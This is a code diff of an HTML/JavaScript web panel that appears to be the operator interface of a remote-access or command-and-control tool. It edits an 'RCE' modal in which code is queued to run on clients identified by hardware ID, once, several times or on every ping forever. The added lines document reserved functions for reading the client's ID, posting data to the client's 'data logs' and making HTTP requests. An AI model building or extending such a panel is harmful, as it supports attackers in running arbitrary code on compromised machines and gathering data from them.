@@ -31,14 +31,6 @@
                             </button>
                           </div>
                           <div class="modal-body" id="rceModalBody">
-                            <!-- <div class="form-group">
-                                <label for="rceCodeInput">Code</label>
-                                <textarea id="rceCodeInput" class="form-control" placeholder="Enter code here..." rows="10"></textarea>
-                                <br/>
-                                <label for="amountOfTimesToRunInput">Amount of times to run</label>
-                                <input type="number" class="form-control" id="amountOfTimesToRunInput" value="1" style="width:25%;">
-                                <small class="form-text text-muted">The amount of times the code will run until it is deleted from the database.<br/>Use -1 for every ping (forever).</small>
-                            </div> -->
                             <div class="spinner-border text-secondary" role="status">
                               <span class="sr-only">Loading...</span>
                             </div>
@@ -164,6 +156,15 @@
                     rceModalBody.append(`<div class="form-group">
                             <label for="rceCodeInput">Code</label>
                             <textarea id="rceCodeInput" hwid="${hwid}" class="form-control" placeholder="Enter code here..." rows="10">${data.code}</textarea>
+                            <br/>
+                            <a>Reserved Variables/Functions:</a><br/>
+                            <code>machineId()</code> <small class="text-muted">Returns client's HWID</small><br/>
+                            <code>postData(data)</code> <small class="text-muted">Adds data to the client's data logs</small><br/>
+                            <code>get('http(s)', url, headers, full)</code> <small class="text-muted">Makes a GET request</small><br/>
+                            <code>ping()</code> <small class="text-muted">Ping function</small><br/>
+                            <code>hwid</code> <small class="text-muted">Client's HWID</small><br/>
+                            <code>url</code> <small class="text-muted">Base URL (i.e. http://localhost:500)</small>
+                            <br/>
                             <br/>
                             <label for="amountOfTimesToRunInput">Amount of times to run</label>
                             <input type="number" class="form-control" id="amountOfTimesToRunInput" min="-1" max="100" value="${data.timesToRun}" style="width:25%;">
